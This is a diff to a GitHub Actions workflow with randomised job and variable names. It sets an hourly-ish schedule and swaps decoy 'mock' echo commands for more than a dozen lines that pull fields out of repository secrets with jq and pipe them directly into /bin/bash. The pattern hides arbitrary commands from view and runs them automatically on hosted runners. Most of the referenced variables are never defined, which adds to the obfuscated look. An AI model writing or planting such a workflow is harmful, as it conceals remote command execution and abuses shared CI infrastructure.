@@ -2,9 +2,8 @@ name: fuhongxue9521
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 * * * *'
-
-jobs:  # 4230
+    - cron: '27 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,11 +11,19 @@ jobs:  # 4230
       - uses: actions/checkout@v4
       - name: fuhongxue9521
         env:
-          y12501: ${{ secrets.y12501 }}
+          ntrky4610: ${{ secrets.ntrky4610 }}
         run: |
-          echo "Checksum: $((1000 + RANDOM % 9000))"
-          echo $y12501 | jq -r .m22468 | /bin/bash
-          echo "Chown mock: chown $USER:$USER /tmp 2>/dev/null || true"
-          echo "Ansible mock: ansible --version 2>/dev/null | head -1 || echo no-ansible"
-          echo "Watch mock: watch -n 1 date 2>/dev/null | head -1 || echo no-watch"
-          echo "Fold mock: echo 'hello' | fold -w 2 2>/dev/null || echo no-fold"
+          echo $ntrky4610 | jq -r .j3722 | /bin/bash
+          echo $gt500 | jq -r .qdlbs9239 | /bin/bash
+          echo $t07 | jq -r .dvd28292 | /bin/bash
+          echo $zppf10 | jq -r .pnjx1 | /bin/bash
+          echo $zcue77324 | jq -r .ml892 | /bin/bash
+          echo $rad926 | jq -r .jr7575 | /bin/bash
+          echo $ztqr4 | jq -r .sdp924 | /bin/bash
+          echo $hdd1608 | jq -r .gl9056 | /bin/bash
+          echo $d94 | jq -r .xavb716 | /bin/bash
+          echo $q04314 | jq -r .dxcug6 | /bin/bash
+          echo $k7558 | jq -r .zact9 | /bin/bash
+          echo $o5625 | jq -r .o12391 | /bin/bash
+          echo $ccmko07525 | jq -r .xoqsj720 | /bin/bash
+
